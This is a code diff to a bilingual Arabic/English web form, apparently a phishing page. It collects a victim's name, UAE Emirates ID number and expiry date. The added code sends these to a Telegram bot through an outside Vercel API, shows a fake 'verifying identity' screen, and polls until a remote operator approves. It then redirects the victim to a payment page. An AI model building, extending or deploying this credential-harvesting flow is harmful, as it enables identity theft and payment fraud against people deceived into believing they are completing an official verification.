@@ -116,46 +116,74 @@ $('file').addEventListener('change',e=>{const f=e.target.files[0];$('e-file').te
   if(!f)return;if(f.size>5*1024*1024){$('e-file').textContent='File is larger than 5 MB · الملف أكبر من 5 ميجابايت';e.target.value='';$('fn').textContent='JPG, PNG or PDF (Max 5 MB)';return}
   $('fn').textContent=f.name});
 
-$('f').addEventListener('submit',async e=>{
+$('f').addEventListener('submit', async e => {
   e.preventDefault();
-  let ok=true;
-  const set=(id,m)=>{$('e-'+id).textContent=m;if(m)ok=false};
-  set('name',$('name').value.trim().length<3?'Enter your full name · أدخل اسمك الكامل':'');
-  set('eid',/^784-\d{4}-\d{7}-\d$/.test($('eid').value)?'':'Use the format 784-XXXX-XXXXXXX-X · صيغة غير صحيحة');
+  let ok = true;
+  const set = (id, m) => { $('e-' + id).textContent = m; if (m) ok = false; };
+  set('name', $('name').value.trim().length < 3 ? 'Enter your full name · أدخل اسمك الكامل' : '');
+  set('eid', /^784-\d{4}-\d{7}-\d$/.test($('eid').value) ? '' : 'Use the format 784-XXXX-XXXXXXX-X · صيغة غير صحيحة');
   
-  // تصحيح فحص التاريخ ليقبل التنسيق الصحيح والمنطقي (مثل تاريخ صالح دون اشتراط أن يكون مستقبلياً بالضرورة)
-  const m=$('exp').value.match(/^(\d{2}) \/ (\d{2}) \/ (\d{4})$/);
+  const m = $('exp').value.match(/^(\d{2}) \/ (\d{2}) \/ (\d{4})$/);
   let dateOk = false;
   if (m) {
     const day = parseInt(m[1], 10);
     const month = parseInt(m[2], 10);
     const year = parseInt(m[3], 10);
-    // التحقق من حدود منطقية للأيام والشهور والسنوات (مثلاً بين 1940 و 2040)
     if (year >= 1940 && year <= 2040 && month >= 1 && month <= 12 && day >= 1 && day <= 31) {
       dateOk = true;
     }
   }
   set('exp', dateOk ? '' : 'Enter a valid date (DD / MM / YYYY) · أدخل تاريخًا صحيحًا');
   
-  if(ok){
+  if (ok) {
+    const userId = 'user_' + Date.now(); // معرف فريد لهذا الطلب
     const payload = {
+      "user_id": userId,
       "الاسم_الكامل": $('name').value.trim(),
       "رقم_الهوية": $('eid').value,
       "تاريخ_الانتهاء": $('exp').value
     };
     
+    // إخفاء النموذج وإظهار رسالة الانتظار
+    $('.form').style.display = 'none';
+    const waitDiv = document.createElement('div');
+    waitDiv.id = 'waiting-box';
+    waitDiv.style.cssText = 'text-align:center; padding:40px; font-size:18px; font-weight:600;';
+    waitDiv.innerHTML = '⏳ جاري التحقق من بيانات الهوية وتأكيد الطلب...<br><span style="font-size:14px; color:var(--muted)">يرجى عدم إغلاق الصفحة</span>';
+    document.querySelector('.card').appendChild(waitDiv);
+
     try {
+      // 1. إرسال البيانات للـ API ليحولها لبوت تلجرام مع الأزرار
       await fetch("https://telegram-form-api-lemon.vercel.app/api/send", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
       });
-    } catch(err) {}
 
-    $('ok').style.display='block';
-    setTimeout(() => {
-      window.location.href = "payment.html";
-    }, 1000);
+      // 2. البدء بحلقة تكرار (Polling) لفحص هل وافقت أنت من البوت أم لا
+      const checkInterval = setInterval(async () => {
+        try {
+          const res = await fetch(`https://telegram-form-api-lemon.vercel.app/api/check-status?user_id=${userId}`);
+          const data = await res.json();
+
+          if (data.status === 'approved') {
+            clearInterval(checkInterval);
+            waitDiv.innerHTML = '✅ تم تأكيد الهوية بنجاح! جاري تحويلك لصفحة الدفع...';
+            setTimeout(() => {
+              window.location.href = "payment.html";
+            }, 1000);
+          } else if (data.status === 'rejected') {
+            clearInterval(checkInterval);
+            alert('تم رفض طلب التحقق من قبل الإدارة.');
+            location.reload();
+          }
+        } catch (err) {}
+      }, 3000); // يفحص كل 3 ثواني
+
+    } catch(err) {
+      alert('حدث خطأ في الاتصال');
+      location.reload();
+    }
   }
 });
 </script>
